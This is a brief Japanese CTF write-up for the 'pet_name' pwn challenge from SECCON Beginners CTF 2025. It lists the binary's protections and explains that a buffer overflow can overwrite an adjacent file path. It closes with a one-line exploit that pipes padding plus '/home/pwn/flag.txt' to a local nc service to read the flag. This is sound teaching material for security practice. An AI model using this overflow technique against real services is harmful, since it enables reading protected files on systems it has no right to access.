# pet_name

100 Points / 586 Solves

## 調査

```sh
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=582050b0b44dab77f1974ae31b51a0a7ef404dfa, for GNU/Linux 3.2.0, not stripped
```

```sh
$ checksec chall
[*] '/home/salt/ctf/writeup/2025/SECCON Beginners CTF 2025/pwn/pet_name/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

- バッファオーバーフローができるため、隣接している読み込み先ファイルパスを上書きするだけで良い

## 実行

```sh
echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/home/pwn/flag.txt\x00\n" | nc localhost 9080
```
